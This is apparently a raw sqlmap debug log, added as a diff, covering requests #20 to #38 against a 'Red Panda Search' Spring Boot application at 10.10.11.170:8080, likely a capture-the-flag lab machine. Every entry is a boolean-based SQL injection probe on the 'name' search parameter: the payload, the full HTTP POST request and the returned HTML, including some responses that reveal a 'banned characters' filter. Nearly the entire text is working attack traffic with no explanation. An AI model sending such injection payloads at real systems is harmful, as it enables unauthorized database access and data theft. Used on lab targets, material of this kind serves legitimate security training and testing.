+[12:50:31] [PAYLOAD] woodenk')) AND 4315=5754 AND (('jVQV' LIKE 'jVQV
+[12:50:31] [TRAFFIC OUT] HTTP request [#20]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 83
+Connection: close
+
+name=woodenk%27%29%29%20AND%204315%3D5754%20AND%20%28%28%27jVQV%27%20LIKE%20%27jVQV
+
+[12:50:31] [TRAFFIC IN] HTTP response [#20] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:30 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk')) AND 4315=5754 AND (('jVQV' LIKE 'jVQV</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:31] [PAYLOAD] woodenk')) AND 5913=5913 AND (('lkaF' LIKE 'lkaF
+[12:50:31] [TRAFFIC OUT] HTTP request [#21]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 83
+Connection: close
+
+name=woodenk%27%29%29%20AND%205913%3D5913%20AND%20%28%28%27lkaF%27%20LIKE%20%27lkaF
+
+[12:50:31] [TRAFFIC IN] HTTP response [#21] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:30 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk')) AND 5913=5913 AND (('lkaF' LIKE 'lkaF</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:31] [PAYLOAD] woodenk'))) AND 9249=5595 AND ((('ullU' LIKE 'ullU
+[12:50:31] [TRAFFIC OUT] HTTP request [#22]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 89
+Connection: close
+
+name=woodenk%27%29%29%29%20AND%209249%3D5595%20AND%20%28%28%28%27ullU%27%20LIKE%20%27ullU
+
+[12:50:31] [TRAFFIC IN] HTTP response [#22] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:30 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk'))) AND 9249=5595 AND ((('ullU' LIKE 'ullU</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:31] [PAYLOAD] woodenk'))) AND 5913=5913 AND ((('IoqV' LIKE 'IoqV
+[12:50:31] [TRAFFIC OUT] HTTP request [#23]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 89
+Connection: close
+
+name=woodenk%27%29%29%29%20AND%205913%3D5913%20AND%20%28%28%28%27IoqV%27%20LIKE%20%27IoqV
+
+[12:50:32] [TRAFFIC IN] HTTP response [#23] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:31 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk'))) AND 5913=5913 AND ((('IoqV' LIKE 'IoqV</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:32] [PAYLOAD] woodenk%' AND 4419=9096 AND 'KAHc%'='KAHc
+[12:50:32] [TRAFFIC OUT] HTTP request [#24]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 70
+Connection: close
+
+name=woodenk%25%27%20AND%204419%3D9096%20AND%20%27KAHc%25%27%3D%27KAHc
+
+[12:50:32] [TRAFFIC IN] HTTP response [#24] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:31 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: Error occured: banned characters</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:32] [DEBUG] setting match ratio for current parameter to 0.980
+[12:50:32] [PAYLOAD] woodenk%' AND 5913=5913 AND 'HIMv%'='HIMv
+[12:50:32] [TRAFFIC OUT] HTTP request [#25]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 70
+Connection: close
+
+name=woodenk%25%27%20AND%205913%3D5913%20AND%20%27HIMv%25%27%3D%27HIMv
+
+[12:50:32] [TRAFFIC IN] HTTP response [#25] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:31 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: Error occured: banned characters</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:32] [PAYLOAD] woodenk' AND 5136=4857 AND 'ColD' LIKE 'ColD
+[12:50:32] [TRAFFIC OUT] HTTP request [#26]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 71
+Connection: close
+
+name=woodenk%27%20AND%205136%3D4857%20AND%20%27ColD%27%20LIKE%20%27ColD
+
+[12:50:32] [TRAFFIC IN] HTTP response [#26] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:31 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' AND 5136=4857 AND 'ColD' LIKE 'ColD</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:32] [PAYLOAD] woodenk' AND 5913=5913 AND 'ZhuB' LIKE 'ZhuB
+[12:50:32] [TRAFFIC OUT] HTTP request [#27]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 71
+Connection: close
+
+name=woodenk%27%20AND%205913%3D5913%20AND%20%27ZhuB%27%20LIKE%20%27ZhuB
+
+[12:50:32] [TRAFFIC IN] HTTP response [#27] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:31 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' AND 5913=5913 AND 'ZhuB' LIKE 'ZhuB</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:32] [PAYLOAD] woodenk") AND 3458=5490 AND ("INyo"="INyo
+[12:50:32] [TRAFFIC OUT] HTTP request [#28]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 70
+Connection: close
+
+name=woodenk%22%29%20AND%203458%3D5490%20AND%20%28%22INyo%22%3D%22INyo
+
+[12:50:32] [TRAFFIC IN] HTTP response [#28] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:31 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk") AND 3458=5490 AND ("INyo"="INyo</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:32] [PAYLOAD] woodenk") AND 5913=5913 AND ("dzFJ"="dzFJ
+[12:50:32] [TRAFFIC OUT] HTTP request [#29]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 70
+Connection: close
+
+name=woodenk%22%29%20AND%205913%3D5913%20AND%20%28%22dzFJ%22%3D%22dzFJ
+
+[12:50:33] [TRAFFIC IN] HTTP response [#29] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:32 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk") AND 5913=5913 AND ("dzFJ"="dzFJ</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:33] [PAYLOAD] woodenk")) AND 9588=7473 AND (("jNCV"="jNCV
+[12:50:33] [TRAFFIC OUT] HTTP request [#30]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 76
+Connection: close
+
+name=woodenk%22%29%29%20AND%209588%3D7473%20AND%20%28%28%22jNCV%22%3D%22jNCV
+
+[12:50:33] [TRAFFIC IN] HTTP response [#30] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:32 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk")) AND 9588=7473 AND (("jNCV"="jNCV</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:33] [PAYLOAD] woodenk")) AND 5913=5913 AND (("OPxh"="OPxh
+[12:50:33] [TRAFFIC OUT] HTTP request [#31]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 76
+Connection: close
+
+name=woodenk%22%29%29%20AND%205913%3D5913%20AND%20%28%28%22OPxh%22%3D%22OPxh
+
+[12:50:33] [TRAFFIC IN] HTTP response [#31] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:32 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk")) AND 5913=5913 AND (("OPxh"="OPxh</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:33] [PAYLOAD] woodenk"))) AND 3532=6526 AND ((("mmew"="mmew
+[12:50:33] [TRAFFIC OUT] HTTP request [#32]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 82
+Connection: close
+
+name=woodenk%22%29%29%29%20AND%203532%3D6526%20AND%20%28%28%28%22mmew%22%3D%22mmew
+
+[12:50:33] [TRAFFIC IN] HTTP response [#32] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:32 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk"))) AND 3532=6526 AND ((("mmew"="mmew</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:33] [PAYLOAD] woodenk"))) AND 5913=5913 AND ((("FWbh"="FWbh
+[12:50:33] [TRAFFIC OUT] HTTP request [#33]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 82
+Connection: close
+
+name=woodenk%22%29%29%29%20AND%205913%3D5913%20AND%20%28%28%28%22FWbh%22%3D%22FWbh
+
+[12:50:33] [TRAFFIC IN] HTTP response [#33] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:32 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk"))) AND 5913=5913 AND ((("FWbh"="FWbh</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:33] [PAYLOAD] woodenk" AND 1807=1086 AND "fyxl"="fyxl
+[12:50:33] [TRAFFIC OUT] HTTP request [#34]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 64
+Connection: close
+
+name=woodenk%22%20AND%201807%3D1086%20AND%20%22fyxl%22%3D%22fyxl
+
+[12:50:34] [TRAFFIC IN] HTTP response [#34] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:32 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk" AND 1807=1086 AND "fyxl"="fyxl</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:34] [PAYLOAD] woodenk" AND 5913=5913 AND "tIdh"="tIdh
+[12:50:34] [TRAFFIC OUT] HTTP request [#35]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 64
+Connection: close
+
+name=woodenk%22%20AND%205913%3D5913%20AND%20%22tIdh%22%3D%22tIdh
+
+[12:50:34] [TRAFFIC IN] HTTP response [#35] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:33 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk" AND 5913=5913 AND "tIdh"="tIdh</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:34] [PAYLOAD] woodenk") AND 7483=2259 AND ("OZqD" LIKE "OZqD
+[12:50:34] [TRAFFIC OUT] HTTP request [#36]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 77
+Connection: close
+
+name=woodenk%22%29%20AND%207483%3D2259%20AND%20%28%22OZqD%22%20LIKE%20%22OZqD
+
+[12:50:34] [TRAFFIC IN] HTTP response [#36] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:33 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk") AND 7483=2259 AND ("OZqD" LIKE "OZqD</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:34] [PAYLOAD] woodenk") AND 5913=5913 AND ("CIaf" LIKE "CIaf
+[12:50:34] [TRAFFIC OUT] HTTP request [#37]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 77
+Connection: close
+
+name=woodenk%22%29%20AND%205913%3D5913%20AND%20%28%22CIaf%22%20LIKE%20%22CIaf
+
+[12:50:34] [TRAFFIC IN] HTTP response [#37] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:33 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk") AND 5913=5913 AND ("CIaf" LIKE "CIaf</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:34] [PAYLOAD] woodenk")) AND 5079=1336 AND (("eJii" LIKE "eJii
+[12:50:34] [TRAFFIC OUT] HTTP request [#38]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 83
+Connection: close
+
+name=woodenk%22%29%29%20AND%205079%3D1336%20AND%20%28%28%22eJii%22%20LIKE%20%22eJii
+
+[12:50:34] [TRAFFIC IN] HTTP response [#38] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:33 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk")) AND 5079=1336 AND (("eJii" LIKE "eJii</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
